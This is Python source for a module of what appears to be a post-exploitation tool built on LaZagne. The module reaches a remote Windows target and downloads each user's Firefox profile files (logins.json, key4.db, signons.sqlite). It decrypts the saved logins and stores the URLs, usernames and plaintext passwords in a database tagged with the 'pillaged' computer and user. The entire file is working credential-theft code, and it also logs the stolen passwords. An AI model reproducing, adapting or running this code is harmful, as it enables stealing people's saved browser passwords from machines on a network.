import ntpath
import sys
import sqlite3,os,json,base64,binascii
from lib.toolbox import bcolors
from lib.dpapi import *
from lazagne.softwares.browsers.mozilla import Mozilla, firefox_browsers
from lazagne.config import constant


class FIREFOX_LOGINS:
	def __init__(self, options,logger,user,fileops,db):
		self.logindata_path = None
		self.localstate_path = None
		self.localstate_dpapi = None
		self.cookie_path = None
		self.options = options
		self.logging= logger
		self.myfileops = fileops
		self.db = db
		self.aeskey = None
		self.masterkey = None
		self.masterkey_guid = None
		self.logins = {}
		self.cookies = {}
		self.user = user
		self.lasagne_firefox_browsers = firefox_browsers
		self.lasagne_Mozilla = None

	def get_files(self):
		try:
			#files_to_get = os.path.join(profile, 'signons.sqlite')) (profile, 'logins.json')key3.db , key4.db
			#directory_to_get = ['']
			for mybrowser in firefox_browsers:
				blacklist = ['.', '..']
				browser_path=mybrowser[1] #PATH Style is (u'firefox', u'{APPDATA}\\Mozilla\\Firefox'),
				browser_name=mybrowser[0]
				APPDATA=f"Users\\{self.user.username}\\AppData\\Roaming"

				path = browser_path.format(APPDATA=APPDATA)
				self.logging.debug(f"[{self.options.target_ip}] [+] Looking for Mozilla {browser_name} Profile Files in {path}")
				try:
					# Downloading profile file
					localfile = self.myfileops.get_file(ntpath.join(path, 'profiles.ini'))
					if localfile!=None :
						self.logging.debug(f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE}{self.user.username}{bcolors.ENDC} Mozilla {browser_name} Profile files : {ntpath.join(path, 'profiles.ini')}")
					else:
						continue
				except Exception as ex:
					self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Files profiles.ini for Mozilla {browser_name} - browser doesn't exist{bcolors.ENDC}")
					self.logging.debug(ex)
					continue
				#Into profiles directories
				tmp_pwd = ntpath.join(path, 'Profiles')
				my_directory = self.myfileops.do_ls(tmp_pwd, wildcard='*', display=False)
				for infos in my_directory:
					longname, is_directory = infos
					self.logging.debug("ls returned file %s" % longname)
					if longname not in blacklist and is_directory :# and longname=='profiles.ini':
						try:
							self.logging.debug(f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE}{self.user.username}{bcolors.ENDC} Mozilla Profile Directory : {longname}")
							# Downloading profile important files
							for file_to_dl in ['signons.sqlite','logins.json','key3.db', 'key4.db']:
								try:
									localfile = self.myfileops.get_file(ntpath.join(ntpath.join(tmp_pwd, longname),file_to_dl),allow_access_error=True)
								except Exception as ex:
									self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Files for Mozilla{bcolors.ENDC}")
									self.logging.debug(ex)
									continue
						except Exception as ex:
							self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Files for Mozilla{bcolors.ENDC}")
							self.logging.debug(ex)
							continue

		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception FIREFOX get_files{bcolors.ENDC}")
			self.logging.debug(ex)
			return None

	def run(self):
		#Download needed files
		self.get_files()
		#Set new starting path
		#Extract from Lazagne config
		profile = {
		'APPDATA': u'{drive}:\\Users\\{user}\\AppData\\Roaming\\',
		'USERPROFILE': u'{drive}:\\Users\\{user}\\',
		'HOMEDRIVE': u'{drive}:',
		'HOMEPATH': u'{drive}:\\Users\\{user}',
		'ALLUSERSPROFILE': u'{drive}:\\ProgramData',
		'COMPOSER_HOME': u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Composer\\',
		'LOCALAPPDATA': u'{drive}:\\Users\\{user}\\AppData\\Local',
		}
		APPDATA=profile['APPDATA'].replace('{drive}:','{download_path}')
		APPDATA=APPDATA.format(download_path=self.myfileops.get_download_directory(),user=self.user.username)

		#Run Lasagne
		for mybrowser in firefox_browsers:
			try:
				name=mybrowser[0]
				path=mybrowser[1]
				browserpath=path.format(APPDATA=APPDATA).replace('\\','/')
				myMozilla=Mozilla(name,browserpath,logger=self.logging)
				pwd_found = myMozilla.run()
				if len(pwd_found)>0:
					longname=name
					self.user.files[longname] = {}
					self.user.files[longname]['type'] = 'MozillaLoginData'
					self.user.files[longname]['status'] = 'decrypted'
					self.user.files[longname]['path'] = browserpath

					for finding in pwd_found:
						self.logins[finding['URL']] = {}
						self.logins[finding['URL']]['username'] = finding['Login']
						self.logins[finding['URL']]['password'] = finding['Password']
						############PROCESSING DATA
						self.db.add_credz(credz_type='browser-firefox',
										  credz_username=finding['Login'],
										  credz_password=finding['Password'],
										  credz_target=finding['URL'],
										  credz_path=browserpath,
										  pillaged_from_computer_ip=self.options.target_ip,
										  pillaged_from_username=self.user.username)
						self.logging.info(
							f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Firefox Password] {bcolors.ENDC} for {finding['URL']} [ {bcolors.OKBLUE}{self.logins[finding['URL']]['username']} : {self.logins[finding['URL']]['password']}{bcolors.ENDC} ]")
					self.user.files[longname]['secret'] = self.logins


			except Exception as ex:
				self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting logindata for Mozilla {self.user.username} {bcolors.ENDC}")
				self.logging.debug(ex)
				continue
		return self.logins
